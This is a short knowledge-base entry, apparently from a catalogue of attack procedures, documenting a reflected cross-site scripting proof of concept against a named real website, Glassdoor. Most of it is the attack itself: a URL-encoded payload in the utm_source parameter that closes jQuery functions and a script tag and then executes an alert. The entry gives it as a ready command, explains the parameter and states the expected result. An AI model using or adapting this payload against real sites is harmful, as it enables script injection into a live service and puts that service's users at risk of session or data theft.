---
data: >-
  https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
tags:
  - xss
  - poc
type: command
executor: browser
platforms:
  - Web
id: 3aa99664-2214-45b7-b1f7-60cdc5b45a47
created_at: '2025-12-14T00:11:25.407Z'
updated_at: '2025-12-14T00:11:25.407Z'
verified: false
validated: true
submitted: true
---
# Glassdoor XSS POC Initial

## Command

```bash
https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
```

## Description

This URL serves as a proof-of-concept to demonstrate the initial reflected XSS vulnerability by injecting an encoded payload into the utm_source parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `utm_source` | Encoded payload to close jQuery functions and execute alert | Yes |

## Examples

### Basic Usage

```bash
https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
```

## Expected Output

A JavaScript alert box displaying 'xss' in the browser.

## Related

- [[procedures/Initial-Reflected-XSS-Exploitation-on-Glassdoor-utm_source]]
